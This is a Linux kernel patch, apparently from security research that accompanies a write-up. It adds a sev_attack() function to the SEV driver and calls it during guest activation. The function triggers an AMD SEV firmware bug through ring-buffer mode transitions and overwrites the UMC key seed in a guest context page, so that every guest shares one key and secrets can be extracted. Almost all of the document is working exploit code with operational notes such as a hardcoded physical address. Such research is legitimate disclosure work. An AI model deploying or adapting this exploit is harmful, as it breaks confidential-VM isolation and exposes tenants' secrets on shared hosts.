@@ -1,0 +1,87 @@
+From b19172df1443f7e603007d949428a0fc2f30e980 Mon Sep 17 00:00:00 2001
+From: Tom Dohrmann <erbse.13@gmx.de>
+Date: Fri, 8 Dec 2023 13:29:22 +0000
+Subject: [PATCH 5/7] implement attack code
+
+See the write-up for more information on what this does.
+---
+ arch/x86/kvm/svm/sev.c       |  6 ++++++
+ drivers/crypto/ccp/sev-dev.c | 40 ++++++++++++++++++++++++++++++++++++
+ 2 files changed, 46 insertions(+)
+
+diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
+index 230296549c91..dfd98c3dac72 100644
+--- a/arch/x86/kvm/svm/sev.c
++++ b/arch/x86/kvm/svm/sev.c
+@@ -1993,11 +1993,17 @@ static void *snp_context_create(struct kvm *kvm, struct kvm_sev_cmd *argp)
+ 	return context;
+ }
+ 
++void sev_attack(void);
++
+ static int snp_bind_asid(struct kvm *kvm, int *error)
+ {
+ 	struct kvm_sev_info *sev = &to_kvm_svm(kvm)->sev_info;
+ 	struct sev_data_snp_activate data = {0};
+ 
++	// Corrupt the UMC key seed guest context page, just before the UMC key
++	// seed is installed into the dies.
++	sev_attack();
++
+ 	data.gctx_paddr = __psp_pa(sev->snp_context);
+ 	data.asid   = sev_get_asid(kvm);
+ 	return sev_issue_cmd(kvm, SEV_CMD_SNP_ACTIVATE, &data, error);
+diff --git a/drivers/crypto/ccp/sev-dev.c b/drivers/crypto/ccp/sev-dev.c
+index b6eb83bd34ba..c170db74e63d 100644
+--- a/drivers/crypto/ccp/sev-dev.c
++++ b/drivers/crypto/ccp/sev-dev.c
+@@ -1678,6 +1678,46 @@ static int sev_ioctl_do_get_id2(struct sev_issue_cmd *argp)
+ 	return ret;
+ }
+ 
++// This function triggers a bug in the SEV firmware to overwrite bytes 0..=15
++// in physical memory. We use this to overwrite the UMC key seed in a guest
++// context page. By forcing all guests to use the same key, we can extract
++// secrets.
++void sev_attack(void)
++{
++	struct sev_data_ring_buffer data;
++	int error;
++	struct sev_issue_cmd argp = {};
++	
++	// For some reason we need to enter and enter ring buffer mode twice.
++	// I didn't really investigate why this is needed. My guess is that the
++	// first exit doesn't work for some reason. At the end of the day, this
++	// doesn't really matter for the exploit, so we just do the steps twice.
++	for (int i = 0; i < 2; i++) {
++	
++		// Prepare the ring buffer command.
++		memset(&data, 0, sizeof(data));
++		// An address not covered by the RMP. Adjust the RMP range setting in the
++		// BIOS accordingly or change the address. This is the address the firmware
++		// will try to transition back into the hypervisor state even though it's
++		// not covered by the RMP.
++		data.QLoStatVal = 0x000000204ecff000;
++		// This address doesn't really matter, but it has to be valid.
++		data.QLoCmdPtr = data.QLoStatVal;
++		// Must be 1.
++		data.QLoSize = 1;
++
++		// Enter ring buffer mode.
++		__sev_do_cmd_locked(SEV_CMD_RING_BUFFER, &data, &error);
++
++		// Execute a command in mailbox mode. This will unset `RBCtl.RBModeAct` and
++		// `RBCtl.X86Writes` and cause an exit back into mailbox mode.
++		// The clean-up part of the exit from ring-buffer mode to mailbox mode
++		// triggers the bug.
++		sev_ioctl_do_get_id2(&argp);
++	}
++}
++EXPORT_SYMBOL_GPL(sev_attack);
++
+ static int sev_ioctl_do_get_id(struct sev_issue_cmd *argp)
+ {
+ 	struct sev_data_get_id *data;
+-- 
+2.34.1
+
